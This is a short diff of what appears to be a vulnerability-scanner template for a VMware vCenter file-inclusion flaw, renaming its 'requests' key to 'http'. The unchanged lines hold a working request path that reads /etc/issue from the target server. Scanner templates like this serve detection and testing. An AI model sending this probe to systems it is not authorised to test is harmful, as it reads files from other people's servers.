@@ -6,7 +6,7 @@ info:
   severity: high
   tags: vmware,lfi,vcenter
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/eam/vib?id=/etc/issue"
